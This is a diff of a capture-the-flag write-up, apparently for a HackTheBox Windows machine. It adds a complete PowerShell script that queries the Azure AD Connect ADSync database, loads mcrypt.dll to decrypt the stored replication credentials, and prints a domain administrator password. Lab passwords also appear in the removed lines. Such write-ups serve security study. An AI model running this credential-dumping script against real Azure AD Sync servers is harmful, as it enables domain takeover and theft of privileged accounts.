@@ -321,98 +321,74 @@ This [post](https://blog.xpnsec.com/azuread-connect-for-redteam/) covers exploit
 
 It turns out mhope is able to connect to the local database and pull the configuration. I can then decrypt it and get the username and password for the account that handles replication.
 
-The exploit breaks down into three parts:
-
-1. Get the information from the DB to retrieve the encryption keys from the KeyManager.
-2. Get the config and encrypted password from the DB.
-3. Fetch the keys and decrypt the password.
-
-### 1. Get the information from the DB to retrieve the encryption keys from the KeyManager.
-
-Use `sqlcmd` to get the information from the DB to retrieve the encryption keys from the KeyManager.
+First of all, we need to connect to the MS SQL database. We can see that’s running (port 1433):
 
 ```bash
-*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -d ADSync -Q 'SELECT keyset_id, instance_id, entropy FROM mms_server_configuration'
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> netstat -nto
 
-keyset_id   instance_id                          entropy
------------ ------------------------------------ ------------------------------------
-          1 1852B527-DD4F-4ECF-B541-EFCCBFF29E31 194EC2FC-F186-46CF-B44D-071EB61F49CD
+Active Connections
+
+  Proto  Local Address          Foreign Address        State           PID      Offload State
+
+  TCP    10.10.10.172:1433      10.10.10.172:49825     ESTABLISHED     3416     InHost
+  TCP    10.10.10.172:1433      10.10.10.172:49826     ESTABLISHED     3416     InHost
+  TCP    10.10.10.172:1433      10.10.10.172:49827     ESTABLISHED     3416     InHost
+  TCP    10.10.10.172:1433      10.10.10.172:49828     ESTABLISHED     3416     InHost
+  TCP    10.10.10.172:1433      10.10.10.172:49829     ESTABLISHED     3416     InHost
 ```
 
-### 2. Get the config and encrypted password from the DB.
-
-Use `sqlcmd` to get the config information:
+We should connect to the table “mms_management_agent” that contains the “private_configuration_xml” and “encrypted_configuration” fields. The latter, should actually contain the credentials, but they’re encrypted. The file “mcrypt.dll” in “C:\Program Files\Microsoft Azure AD Sync\Binn” is actually responsible for key management and the decryption of the said data. To decrypt it, we can get the POC from the blog post, and change the first line (the client connection to the DB):
 
 ```bash
-*Evil-WinRM* PS C:\Users\mhope\Documents> sqlcmd -y0 -d ADSync -Q 'SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = "AD"'
-<adma-configuration>
- <forest-name>MEGABANK.LOCAL</forest-name>
- <forest-port>0</forest-port>
- <forest-guid>{00000000-0000-0000-0000-000000000000}</forest-guid>
- <forest-login-user>administrator</forest-login-user>
- <forest-login-domain>MEGABANK.LOCAL</forest-login-domain>
- <sign-and-seal>1</sign-and-seal>
- <ssl-bind crl-check="0">0</ssl-bind>
- <simple-bind>0</simple-bind>
- <default-ssl-strength>0</default-ssl-strength>
- <parameter-values>
-  <parameter name="forest-login-domain" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
-  <parameter name="forest-login-user" type="string" use="connectivity" dataType="String">administrator</parameter>
-  <parameter name="password" type="encrypted-string" use="connectivity" dataType="String" encrypted="1" />
-  <parameter name="forest-name" type="string" use="connectivity" dataType="String">MEGABANK.LOCAL</parameter>
-  <parameter name="sign-and-seal" type="string" use="connectivity" dataType="String">1</parameter>
-  <parameter name="crl-check" type="string" use="connectivity" dataType="String">0</parameter>
-  <parameter name="ssl-bind" type="string" use="connectivity" dataType="String">0</parameter>
-  <parameter name="simple-bind" type="string" use="connectivity" dataType="String">0</parameter>
-  <parameter name="Connector.GroupFilteringGroupDn" type="string" use="global" dataType="String" />
-  <parameter name="ADS_UF_ACCOUNTDISABLE" type="string" use="global" dataType="String" intrinsic="1">0x2</parameter>
-  <parameter name="ADS_GROUP_TYPE_GLOBAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000002</parameter>
-  <parameter name="ADS_GROUP_TYPE_DOMAIN_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
-  <parameter name="ADS_GROUP_TYPE_LOCAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000004</parameter>
-  <parameter name="ADS_GROUP_TYPE_UNIVERSAL_GROUP" type="string" use="global" dataType="String" intrinsic="1">0x00000008</parameter>
-  <parameter name="ADS_GROUP_TYPE_SECURITY_ENABLED" type="string" use="global" dataType="String" intrinsic="1">0x80000000</parameter>
-  <parameter name="Forest.FQDN" type="string" use="global" dataType="String" intrinsic="1">MEGABANK.LOCAL</parameter>
-  <parameter name="Forest.LDAP" type="string" use="global" dataType="String" intrinsic="1">DC=MEGABANK,DC=LOCAL</parameter>
-  <parameter name="Forest.Netbios" type="string" use="global" dataType="String" intrinsic="1">MEGABANK</parameter>
-</parameter-values>
- <password-hash-sync-config>
-            <enabled>1</enabled>
-            <target>{B891884F-051E-4A83-95AF-2544101C9083}</target>
-         </password-hash-sync-config>
-</adma-configuration> 8AAAAAgAAABQhCBBnwTpdfQE6uNJeJWGjvps08skADOJDqM74hw39rVWMWrQukLAEYpfquk2CglqHJ3GfxzNWlt9+ga+2wmWA0zHd3uGD8vk/vfnsF3p2aKJ7n9IAB51xje0QrDLNdOqOxod8n7VeybNW/1k+YWuYkiED3xO8Pye72i6D9c5QTzjTlXe5qgd4TCdp4fmVd+UlL/dWT/mhJHve/d9zFr2EX5r5+1TLbJCzYUHqFLvvpCd1rJEr68g95aWEcUSzl7mTXwR4Pe3uvsf2P8Oafih7cjjsubFxqBioXBUIuP+BPQCETPAtccl7BNRxKb2aGQ=
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
 ```
 
-The encrypted password is there at the bottom.
+After this edit, the final `get_password.ps1` exploit script will look like this:
 
+```powershell
+$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
+$client.Open()
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$key_id = $reader.GetInt32(0)
+$instance_id = $reader.GetGuid(1)
+$entropy = $reader.GetGuid(2)
+$reader.Close()
 
-### 3. Fetch the keys and decrypt the password.
+$cmd = $client.CreateCommand()
+$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
+$reader = $cmd.ExecuteReader()
+$reader.Read() | Out-Null
+$config = $reader.GetString(0)
+$crypted = $reader.GetString(1)
+$reader.Close()
 
+add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
+$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+$km.LoadKeySet($entropy, $instance_id, $key_id)
+$key = $null
+$km.GetActiveCredentialKey([ref]$key)
+$key2 = $null
+$km.GetKey(1, [ref]$key2)
+$decrypted = $null
+$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
+$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
+$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
+$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerXML}}
+Write-Host ("Domain: " + $domain.Domain)
+Write-Host ("Username: " + $username.Username)
+Write-Host ("Password: " + $password.Password)
+```
 
-
-
-
-## Bloodhound
-
+Upload script and got adminsitrator password, then got the root file:
 
 ```bash
-bloodhound-python -ns 10.10.10.172 -d MEGABANK.LOCAL -dc MEGABANK.LOCAL -u mhope -p 4n0therD4y@n0th3r$ -c All
+*Evil-WinRM* PS C:\Users\mhope\Documents> upload get_password.ps1
+
+*Evil-WinRM* PS C:\Users\mhope\Documents> . .\get_password.ps1
+Domain: MEGABANK.LOCAL
+Username: administrator
+Password: d0m@in4dminyeah!
 ```
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
